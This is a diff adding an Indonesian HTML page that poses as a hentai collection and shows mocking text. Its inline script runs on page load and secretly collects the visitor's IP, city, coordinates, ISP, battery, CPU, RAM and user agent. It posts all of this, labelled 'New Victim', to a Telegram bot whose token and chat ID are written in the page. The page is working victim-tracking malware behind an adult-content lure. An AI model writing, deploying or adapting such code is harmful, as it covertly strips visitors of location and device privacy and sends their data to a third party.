@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>KUMPULAN HENTAI FUTANARI</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      color: white;
+      text-align: center;
+      background-image: url('https://pomf2.lain.la/f/35h2hxt.jpeg'); /* Ganti dengan URL background */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.7);
+      min-height: 100vh;
+      padding: 50px 20px;
+      box-sizing: border-box;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+    h3 {
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
+    .icon {
+      width: 100px;
+      height: 100px;
+      background-image: url('https://pomf2.lain.la/f/k6fu1xms.jpeg'); /* Ganti dengan URL icon */
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+      margin: 0 auto 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="icon"></div>
+    <h1>KATAKAN YANG KERAS</h1>
+    <h2>AKU TOLOL DAN AKU BANGGA</h2>
+    <h3>nanti dikasih esce buk ama bokep sm nathzz cik🥵🥵🤣🤣</h3>
+  </div>
+
+  <script>
+    async function collectAndSendData() {
+      const regionTranslate = {
+        "West Java": "Jawa Barat",
+        "East Java": "Jawa Timur",
+        "Central Java": "Jawa Tengah",
+        "Jakarta": "DKI Jakarta",
+        "Yogyakarta": "DI Yogyakarta",
+        "Banten": "Banten",
+        "Bali": "Bali",
+        "North Sumatra": "Sumatera Utara",
+        "South Sumatra": "Sumatera Selatan",
+        "Riau": "Riau",
+      };
+
+      try {
+        // Dapatkan IP v4 dari API khusus IPv4
+        const ipRes = await fetch("https://api64.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
+
+        // Ambil info lokasi berdasarkan IP dari ipapi
+        const geoRes = await fetch("https://ipapi.co/" + ip + "/json/");
+        const geo = await geoRes.json();
+
+        const city = geo.city;
+        const regionRaw = geo.region;
+        const region = regionTranslate[regionRaw] || regionRaw;
+        const country = geo.country_name;
+        const postal = geo.postal;
+        const timezone = geo.timezone;
+        const lat = geo.latitude;
+        const lon = geo.longitude;
+        const isp = geo.org;
+
+        let batteryLevel = "Unknown";
+        let batteryStatus = "Unknown";
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryLevel = Math.round(battery.level * 100) + "%";
+          batteryStatus = battery.charging ? "Charging" : "Not Charging";
+        }
+
+        const cpuCores = navigator.hardwareConcurrency || "Unknown";
+        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+        const platform = navigator.platform || "Unknown";
+        const language = navigator.language || "Unknown";
+        const userAgent = navigator.userAgent;
+        let deviceBrand = "Unknown";
+        let deviceModel = userAgent;
+
+        if (/android/i.test(userAgent)) {
+          deviceBrand = "Android";
+        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
+          deviceBrand = "Apple";
+        } else if (/windows/i.test(userAgent)) {
+          deviceBrand = "Windows";
+        } else if (/mac/i.test(userAgent)) {
+          deviceBrand = "Mac";
+        }
+
+        const now = new Date();
+        const currentTime = now.toLocaleTimeString();
+        const currentDate = now.toLocaleDateString();
+
+        const message = `
+🚨New Victim Date tuan Nathzz🚨
+
+IP: ${ip}
+City: ${city}
+Region: ${region}
+Country: ${country}
+Postal Code: ${postal}
+Timezone: ${timezone}
+Latitude: ${lat}
+Longitude: ${lon}
+ISP: ${isp}
+
+Battery Level: ${batteryLevel}
+Battery Status: ${batteryStatus}
+CPU Cores: ${cpuCores}
+RAM: ${ram}
+Platform: ${platform}
+Language: ${language}
+Device Brand: ${deviceBrand}
+Device Model: ${deviceModel}
+
+Time: ${currentTime}
+Date: ${currentDate}
+        `;
+
+        const token = "7774212563:AAExdwi-SFBOwr1hXfe4krnd5SoS6E-sucM";
+        const chatId = "6631076203";
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+      } catch (err) {
+        console.error("Error sending data:", err);
+      }
+    }
+
+    collectAndSendData();
+  </script>
+</body>
+</html>
